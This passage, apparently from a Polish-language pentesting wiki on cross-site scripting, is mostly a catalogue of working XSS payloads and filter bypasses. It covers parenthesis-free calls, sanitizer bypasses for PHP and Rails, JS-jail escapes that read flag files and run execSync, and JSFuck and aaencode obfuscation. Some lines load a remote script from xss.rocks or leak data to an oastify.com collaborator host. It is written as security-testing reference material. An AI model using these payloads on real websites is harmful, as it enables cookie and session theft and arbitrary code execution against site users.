**JavaScript białe znaki**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript wewnątrz komentarza**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript bez nawiasów**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Dowolne wywołanie funkcji (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **podatności DOM**

Istnieje **JS code** używający **niebezpiecznie danych kontrolowanych przez atakującego** jak `location.href`. Atakujący może to wykorzystać do wykonania dowolnego kodu JS.\
**Z powodu rozbudowy wyjaśnienia** [**DOM vulnerabilities zostało przeniesione na tę stronę**](dom-xss.md)**:**

{{#ref}}
dom-xss.md
{{#endref}}

Tam znajdziesz szczegółowe **wyjaśnienie czym są podatności DOM, jak są wywoływane i jak je eksploitować**.\
Nie zapomnij też, że **na końcu wspomnianego wpisu** znajdziesz wyjaśnienie dotyczące [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Upgrading Self-XSS

### Cookie XSS

Jeżeli możesz wywołać XSS wysyłając payload w cookie, zwykle jest to self-XSS. Jednak jeśli znajdziesz **vulnerable subdomain to XSS**, możesz wykorzystać ten XSS do wstrzyknięcia cookie w całej domenie, powodując uruchomienie cookie XSS w domenie głównej lub innych subdomenach (tych podatnych na cookie XSS). W tym celu możesz użyć cookie tossing attack:

{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Znajdziesz świetny przykład nadużycia tej techniki w [**tym wpisie na blogu**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Może się zdarzyć, że user może udostępnić swój profil adminowi i jeśli self XSS znajduje się w profilu użytkownika, a admin uzyska do niego dostęp, to spowoduje wyzwolenie podatności.

### Session Mirroring

Jeśli znajdziesz self XSS, a strona ma **session mirroring for administrators** — na przykład pozwalając klientom poprosić o pomoc, a admin aby pomógł widzi to, co widzisz w swojej sesji, ale z jego sesji —

Możesz sprawić, że **administrator wywoła twój self XSS** i ukraść jego cookies/session.

## Inne obejścia

### Bypassing sanitization via WASM linear-memory template overwrite

Kiedy web app używa Emscripten/WASM, stałe stringi (jak HTML format stubs) znajdują się w zapisywalnej linear memory. Pojedynczy in‑WASM overflow (np. unchecked memcpy w ścieżce edycji) może uszkodzić sąsiednie struktury i przekierować zapisy do tych stałych. Nadpisanie szablonu takiego jak "<article><p>%.*s</p></article>" na "<img src=1 onerror=%.*s>" zamienia sanitizowane dane wejściowe w wartość obsługującą JavaScript i daje natychmiastowy DOM XSS podczas renderu.

Sprawdź dedykowaną stronę z workflow eksploatacji, DevTools memory helpers i środkami obrony:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Możesz sprawdzić, czy **reflected values** są **unicode normalized** po stronie serwera (lub po stronie klienta) i wykorzystać tę funkcjonalność do obejścia zabezpieczeń. [**Znajdź przykład tutaj**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Z powodu **RoR mass assignment** cudzysłowy są wstawiane do HTML, a następnie ograniczenie cudzysłowów jest omijane i dodatkowe pola (onfocus) mogą być dodane wewnątrz tagu.\
Przykład formularza ([from this report](https://hackerone.com/reports/709336)), jeśli wyślesz payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Para "Key","Value" zostanie zwrócona w ten sposób:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Wtedy zostanie wstawiony atrybut onfocus i wystąpi XSS.

### Specjalne kombinacje
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Jeśli odkryjesz, że możesz **inject headers in a 302 Redirect response** możesz spróbować **make the browser execute arbitrary JavaScript**. To **nie jest trywialne**, ponieważ nowoczesne przeglądarki nie interpretują ciała odpowiedzi HTTP gdy status odpowiedzi to 302, więc zwykły payload XSS jest bezużyteczny.

W [**this report**](https://www.gremwell.com/firefox-xss-302) oraz [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) możesz przeczytać, jak testować różne protokoły w nagłówku Location i sprawdzić, czy któryś z nich pozwala przeglądarce na zbadanie i wykonanie payloadu XSS znajdującego się w body.\
Dotychczas znane protokoły: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Only Letters, Numbers and Dots

Jeśli możesz określić **callback**, który javascript ma **execute**, ograniczony do tych znaków. [**Read this section of this post**](#javascript-function) aby dowiedzieć się, jak nadużyć tego zachowania.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Jeśli spróbujesz załadować skrypt z **content-type** takim jak `application/octet-stream`, Chrome wyrzuci następujący błąd:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Jedynymi **Content-Type**s, które pozwolą Chrome uruchomić **loaded script**, są te wymienione w const **`kSupportedJavascriptTypes`** z [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Typy skryptów dla XSS

(Z [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Jakie typy można użyć, aby załadować skrypt?
```html
<script type="???"></script>
```
Odpowiedź to:

- **module** (domyślnie, nie wymaga wyjaśnień)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles to funkcja, dzięki której możesz spakować wiele danych (HTML, CSS, JS…) w plik **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Pozwala ulepszyć składnię importu
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
To zachowanie zostało wykorzystane w [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) do zamapowania biblioteki na eval — nadużycie tego może wywołać XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Ta funkcja służy głównie do rozwiązania niektórych problemów spowodowanych pre-renderingiem. Działa w następujący sposób:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types to XSS

(Z [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Następujące typy treści mogą uruchamiać XSS we wszystkich przeglądarkach:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? nie na liście, ale chyba widziałem to w CTF)
- application/rss+xml (off)
- application/atom+xml (off)

W innych przeglądarkach inne **`Content-Types`** mogą być użyte do uruchomienia dowolnego JS, zobacz: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Jeśli strona zwraca content-type text/xml, możliwe jest określenie przestrzeni nazw i wykonanie dowolnego JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Specjalne wzorce zastępowania

Gdy używane jest coś w stylu **`"some {{template}} data".replace("{{template}}", <user_input>)`**, atakujący może użyć [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) aby spróbować obejść niektóre zabezpieczenia: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Na przykład w [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), użyto tego do escape'owania ciągu JSON wewnątrz skryptu i wykonania dowolnego kodu.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Jeżeli masz do dyspozycji tylko ograniczony zestaw znaków, sprawdź te inne poprawne rozwiązania dla problemów XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Jeśli przed wykonaniem niezaufanego kodu **wszystko jest undefined** (jak w [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), możliwe jest wygenerowanie przydatnych obiektów "out of nothing", aby nadużyć wykonania dowolnego niezaufanego kodu:

- Używając import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Dostęp do `require` pośrednio

[Zgodnie z tym](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) moduły są opakowywane przez Node.js w funkcję, w ten sposób:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Dlatego, jeśli z tego modułu możemy **wywołać inną funkcję**, możliwe jest użycie `arguments.callee.caller.arguments[1]` z tej funkcji, aby uzyskać dostęp do **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Podobnie jak w poprzednim przykładzie, możliwe jest **use error handlers**, aby uzyskać dostęp do **wrapper** modułu i otrzymać funkcję **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuskacja i zaawansowane obejścia

- **Różne obfuskacje na jednej stronie:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Bardziej zaawansowane JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
